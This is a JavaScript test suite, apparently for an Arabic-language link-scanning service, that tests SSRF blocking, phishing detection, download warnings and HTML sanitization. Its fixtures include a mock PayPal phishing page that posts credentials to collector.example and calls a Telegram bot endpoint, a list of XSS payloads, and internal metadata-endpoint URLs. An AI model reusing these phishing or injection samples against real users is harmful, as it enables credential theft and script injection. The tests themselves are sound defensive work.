'use strict';

/* الزيارة الآمنة للروابط: الحماية من SSRF، كشف صفحات التصيد، الملفات، النطاقات غير الموجودة، والاستضافة. */

const test = require('node:test');
const assert = require('node:assert/strict');
const http = require('node:http');
const { createInspector, isPublicIp, analyzeHtml, countryName } = require('../server/inspect');
const { createScan } = require('../server/scan');
const { createIntel } = require('../server/intel');

// خادم محلي بصفحات مختلفة. الأسماء الوهمية (*.test) تُحلّ إلى 127.0.0.1 عبر lookup مخصص
async function withSite(routes, fn) {
    const hits = [];
    const server = http.createServer((req, res) => {
        hits.push(req.headers.host + req.url);
        const route = routes[req.url] || routes['*'];
        if (!route) { res.writeHead(404); return res.end('not found'); }
        route(req, res);
    });
    await new Promise(r => server.listen(0, '127.0.0.1', r));
    const port = server.address().port;
    try { await fn(port, hits); } finally { server.closeAllConnections(); await new Promise(r => server.close(r)); }
}

const fakeDns = map => async host => {
    if (!(host in map)) throw Object.assign(new Error('nx'), { code: 'ENOTFOUND' });
    return [{ address: map[host], family: 4 }];
};

function localInspector(port, extra = {}) {
    return createInspector({
        lookup: fakeDns({ 'shop.test': '127.0.0.1', 'paypal-secure.test': '127.0.0.1', 'files.test': '127.0.0.1', 'hop.test': '127.0.0.1', 'internal.test': '10.0.0.5', ...extra.dns }),
        resolveTxt: extra.resolveTxt || (async () => { throw new Error('no dns'); }),
        isAllowedIp: ip => ip === '127.0.0.1',
        allowedPorts: new Set([port])
    });
}

const html = (body, headers = {}) => (req, res) => { res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', ...headers }); res.end(body); };

test('isPublicIp: يرفض كل العناوين الداخلية والمحلية والمحجوزة', () => {
    for (const ip of ['127.0.0.1', '10.1.2.3', '172.16.5.5', '172.31.255.255', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '224.0.0.1', '255.255.255.255', '::1', '::', 'fe80::1', 'fd00::1', 'fc00::5', '::ffff:127.0.0.1', '::ffff:10.0.0.1', '2001:db8::1', 'not-an-ip']) {
        assert.equal(isPublicIp(ip), false, ip);
    }
    for (const ip of ['8.8.8.8', '1.1.1.1', '172.32.0.1', '104.16.1.1', '2606:4700::1111', '2a00:1450:4001::200e', '::ffff:8.8.8.8']) {
        assert.equal(isPublicIp(ip), true, ip);
    }
});

test('SSRF: لا نتصل أبداً بعنوان داخلي (مباشر، أو عبر DNS، أو عبر تحويل)', async () => {
    // المحقق الحقيقي (isPublicIp): أي عنوان محلي يُرفض قبل أي اتصال
    await withSite({ '*': html('secret admin panel') }, async (port, hits) => {
        const real = createInspector({ lookup: fakeDns({ 'evil.test': '127.0.0.1' }), resolveTxt: async () => [], allowedPorts: new Set([port, 80]) });
        for (const url of [`http://127.0.0.1:${port}/`, `http://evil.test:${port}/`, 'http://169.254.169.254/latest/meta-data/', `http://[::1]:${port}/`]) {
            const r = await real.inspect(url);
            assert.equal(r.visited, false, url);
            assert.equal(r.reason, 'blocked', url);
            assert.ok(r.signals.some(s => s.type === 'danger'), url);
        }
        assert.equal(hits.length, 0, 'لم يصل أي طلب للخادم الداخلي');
    });
    // تحويل من موقع خارجي إلى عنوان داخلي: يُوقف عند التحويل
    await withSite({ '/': (req, res) => { res.writeHead(302, { Location: `http://internal.test:${req.socket.localPort}/admin` }); res.end(); } }, async port => {
        const r = await localInspector(port).inspect(`http://shop.test:${port}/`);
        assert.equal(r.reason, 'blocked');
    });
    // منفذ غير مسموح
    const r = await createInspector({ lookup: fakeDns({ 'x.test': '8.8.8.8' }) }).inspect('http://x.test:22/');
    assert.equal(r.reason, 'port');
    // نطاق غير موجود على منفذ غريب: الحكم «غير موجود» وليس «منفذ»
    const gone = await createInspector({ lookup: fakeDns({}) }).inspect('https://gone.test:8443/');
    assert.equal(gone.exists, false);
});

test('صفحة تصيد: انتحال علامة + كلمة سر + نموذج لنطاق آخر + إرسال لبوت تيليجرام', async () => {
    const page = `<!doctype html><html><head><title>PayPal: Log in to your account</title>
        <link rel="icon" href="https://www.paypalobjects.com/favicon.ico"><img src="https://www.paypal.com/logo.svg"></head>
        <body><h1>Log in</h1><form action="https://collector.example/post.php" method="post">
        <input type="email" name="login_email"><input type="password" name="pass"><button>Log In</button></form>
        <script>fetch("https://api.telegram.org/bot123:abc/sendMessage")</script></body></html>`;
    await withSite({ '/signin': html(page) }, async port => {
        const r = await localInspector(port).inspect(`http://paypal-secure.test:${port}/signin`);
        assert.equal(r.visited, true);
        assert.equal(r.page.title, 'PayPal: Log in to your account');
        assert.equal(r.page.fields.password, 1);
        assert.equal(r.page.claims, 'باي بال');
        assert.equal(r.page.exfil, true);
        assert.deepEqual(r.page.hotlinked, ['باي بال']);
        const texts = r.signals.map(s => s.text).join('\n');
        assert.match(texts, /تيليجرام/);
        assert.match(texts, /تطلب كلمة السر/);
        assert.match(texts, /يرسل بياناتك إلى نطاق ثاني \(collector\.example\)/);
        assert.match(texts, /بدون تشفير/);
        assert.ok(!('html' in r) && !JSON.stringify(r).includes('<form'), 'HTML الصفحة لا يُرجع أبداً');
    });
});

test('الزيارة ترفع حكم الفحص: رابط يبدو عادياً لكن صفحته تصيد = خطر', async () => {
    const page = `<title>مصرف الرافدين - تسجيل الدخول</title><form><input name="card_number"><input name="cvv"><input type="password"></form>`;
    await withSite({ '/': html(page) }, async port => {
        const inspector = localInspector(port);
        const scan = createScan({ config: { limits: { scanPerMinute: 30, loginWindowMs: 60000, badApiKeysPerWindow: 5 } }, users: {}, auth: {}, intel: createIntel({ enabled: false }), stats: {}, inspector });
        const plain = await scan.scanUrl(`http://shop.test:${port}/`);
        const visited = await scan.scanUrl(`http://shop.test:${port}/`, { inspect: true });
        assert.notEqual(plain.level, 'danger');
        assert.equal(visited.level, 'danger');
        assert.ok(visited.score > plain.score);
        assert.equal(visited.checks.live, true);
        assert.equal(visited.inspection.page.claims, 'مصرف الرافدين');
        assert.ok(!('signals' in visited.inspection));
    });
});

test('صفحة عادية: لا ترفع الخطورة، وتعرض العنوان ونصاً مختصراً', async () => {
    await withSite({ '/': html('<html><head><title>مطعم البيت</title></head><body><p>أهلاً بكم في مطعمنا. قائمة الطعام والأسعار.</p></body></html>') }, async port => {
        const r = await localInspector(port).inspect(`http://shop.test:${port}/`);
        assert.equal(r.page.title, 'مطعم البيت');
        assert.match(r.page.excerpt, /أهلاً بكم في مطعمنا/);
        assert.ok(r.signals.every(s => s.weight === 0));
    });
});

test('نطاق غير موجود، تحويلات، وتنزيل APK', async () => {
    const nx = await createInspector({ lookup: fakeDns({}) }).inspect('https://no-such-domain-xyz.test/');
    assert.equal(nx.exists, false);
    assert.match(nx.signals[0].text, /غير موجود/);

    await withSite({
        '/a': (req, res) => { res.writeHead(301, { Location: '/b' }); res.end(); },
        '/b': (req, res) => { res.writeHead(302, { Location: `http://files.test:${req.socket.localPort}/app.apk` }); res.end(); },
        '/app.apk': (req, res) => { res.writeHead(200, { 'Content-Type': 'application/vnd.android.package-archive' }); res.end(Buffer.alloc(2_000_000)); }
    }, async port => {
        const r = await localInspector(port).inspect(`http://hop.test:${port}/a`);
        assert.equal(r.redirects, 2);
        assert.equal(r.finalUrl, `http://files.test:${port}/app.apk`);
        assert.equal(r.download.ext, 'apk');
        assert.ok(r.signals.some(s => s.type === 'danger' && /لا تنصّبه/.test(s.text)));
    });
});

test('حلقة تحويلات لا تنتهي تتوقف، والصفحات الضخمة تُقصّ', async () => {
    await withSite({
        '/loop': (req, res) => { res.writeHead(302, { Location: '/loop' }); res.end(); },
        '/big': (req, res) => { res.writeHead(200, { 'Content-Type': 'text/html' }); res.write('<title>Big</title>'); res.end('x'.repeat(5_000_000)); }
    }, async port => {
        const inspector = localInspector(port);
        const loop = await inspector.inspect(`http://shop.test:${port}/loop`);
        assert.equal(loop.reason, 'too_many_redirects');
        const started = Date.now();
        const big = await inspector.inspect(`http://shop.test:${port}/big`);
        assert.equal(big.page.title, 'Big');
        assert.ok(Date.now() - started < 5000);
    });
});

test('الاستضافة: الدولة بالعربي، والشركة، وكشف خدمات الإخفاء (CDN)، وعدم تطابق جهة عراقية', async () => {
    const txt = async name => {
        if (name.endsWith('.origin.asn.cymru.com')) return [['13335 | 104.16.0.0/13 | NL | ripencc | 2010-07-14']];
        if (name === 'AS13335.asn.cymru.com') return [['13335 | US | arin | 2010-07-14 | CLOUDFLARENET - Cloudflare, Inc., US']];
        return [];
    };
    const inspector = createInspector({ lookup: fakeDns({}), resolveTxt: txt });
    const h = await inspector.hosting('104.16.1.1');
    assert.equal(h.asn, 13335);
    assert.equal(h.country, 'NL');
    assert.equal(h.countryName, countryName('NL'));
    assert.match(h.countryName, /هولندا/);
    assert.equal(h.cdn, true);

    const hostTxt = async name => name.endsWith('.origin.asn.cymru.com') ? [['14061 | 127.0.0.0/8 | DE | ripencc |']] : [['14061 | US | arin | | DIGITALOCEAN-ASN, US']];
    await withSite({ '/': html('<title>مصرف الرافدين</title><input type="password">') }, async port => {
        const r = await localInspector(port, { resolveTxt: hostTxt }).inspect(`http://shop.test:${port}/`);
        assert.equal(r.hosting.org, 'DIGITALOCEAN-ASN, US');
        assert.equal(r.hosting.cdn, false);
        assert.ok(r.signals.some(s => /جهة عراقية/.test(s.text) && /ألمانيا/.test(s.text)));
    });
});

test('تحليل HTML مقاوم: كيانات HTML، ترميز windows-1256، ومدخلات مخفية لا تُحسب', () => {
    const r = analyzeHtml('<title>Sign &amp; in &#x2014; Bank</title><input type="hidden" name="password"><input type="tel" name="phone"><input autocomplete="one-time-code">', new URL('https://a.example/'));
    assert.equal(r.title, 'Sign & in — Bank');
    assert.deepEqual(r.fields, { password: 0, card: 0, otp: 1, identity: 1 });
});

const { sanitizeForSnapshot, sanitizeCss } = require('../server/inspect');

test('المعاينة المعقّمة: لا أكواد ولا روابط فعّالة ولا حقول مخفية، والحقول معطّلة', () => {
    const page = `<html dir="rtl"><head><link rel="stylesheet" href="/a.css"><script>alert(1)</script><style>.x{background:url(https://evil.example/t.gif)}</style></head>
        <body onload="alert(2)"><img src="/logo.png" onerror="alert(3)" alt="شعار"><a href="javascript:alert(4)" onclick="x()">رابط</a>
        <form action="https://grab.example"><input type="password" value="secret1"><input type="hidden" value="secret2"><input type="submit" value="دخول"></form>
        <iframe src="https://evil.example"></iframe><svg onload="alert(5)"></svg><object data="x.swf"></object><p style="color:red;background:url(javascript:alert(6))">نص &amp; <b>عريض</b></p>
        <div class="a&quot;onmouseover=&quot;alert(7)">x</div></body></html>`;
    const r = sanitizeForSnapshot(page, new URL('https://bad.example/login'));
    assert.doesNotMatch(r.body, /<script|\son\w+\s*=|javascript:|<iframe|<svg|<object|href=|action=|secret1|secret2|evil\.example/i);
    assert.match(r.body, /class="aonmouseoveralert7"/);   // يبقى نصاً داخل اسم الصنف بلا علامات تنصيص، فلا يُنفَّذ
    assert.match(r.body, /<input type="password" disabled>/);
    assert.match(r.body, /<input type="submit" value="دخول" disabled>/);
    assert.match(r.body, /نص &amp; <b>عريض<\/b>/);
    assert.equal(r.dir, 'rtl');
    assert.deepEqual(r.stylesheets.map(u => u.href), ['https://bad.example/a.css']);
    assert.deepEqual(r.images.map(u => u.href), ['https://bad.example/logo.png']);
    assert.doesNotMatch(r.inlineCss.join(''), /url\(|evil/);
    assert.equal(sanitizeCss('@import "x.css"; a{b:url(x)} </style><script>'), ' a{b:none} /style>script>');
});

test('المعاينة: الصور والأنماط تُجلب من الخادم وتُضمَّن، والرابط يحتاج دخول وعزل كامل', async () => {
    const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
    await withSite({
        '/': html('<html><head><link rel="stylesheet" href="/s.css"></head><body><img src="/i.png"><h1>Hi</h1></body></html>'),
        '/s.css': (req, res) => { res.writeHead(200, { 'Content-Type': 'text/css' }); res.end('h1{color:#123456}'); },
        '/i.png': (req, res) => { res.writeHead(200, { 'Content-Type': 'image/png' }); res.end(png); }
    }, async port => {
        const inspector = localInspector(port);
        const r = await inspector.inspect(`http://shop.test:${port}/`);
        assert.match(r.snapshotId, /^[A-Za-z0-9_-]{24}$/);
        const doc = inspector.getSnapshot(r.snapshotId);
        assert.match(doc, /h1\{color:#123456\}/);
        assert.match(doc, /<img src="data:image\/png;base64,/);
        assert.equal(inspector.getSnapshot('x'.repeat(24)), null);

        const { startServer, request, registerUser, authed } = require('./helpers');
        const app = await startServer({}, null, { inspector });
        try {
            const anon = await request(app, 'GET', `/api/scan/snapshot/${r.snapshotId}`);
            assert.equal(anon.status, 401);
            const { cookie } = await registerUser(app);
            const ok = await request(app, 'GET', `/api/scan/snapshot/${r.snapshotId}`, { headers: authed(app, cookie) });
            assert.equal(ok.status, 200);
            assert.match(ok.headers['content-security-policy'], /^sandbox; default-src 'none'; img-src data:/);
            assert.equal(ok.headers['x-frame-options'], 'SAMEORIGIN');
            const gone = await request(app, 'GET', `/api/scan/snapshot/${'A'.repeat(24)}`, { headers: authed(app, cookie) });
            assert.equal(gone.status, 404);
            const main = await request(app, 'GET', '/login');
            assert.match(main.headers['content-security-policy'], /frame-src 'self'/);
        } finally {
            await app.close();
        }
    });
});
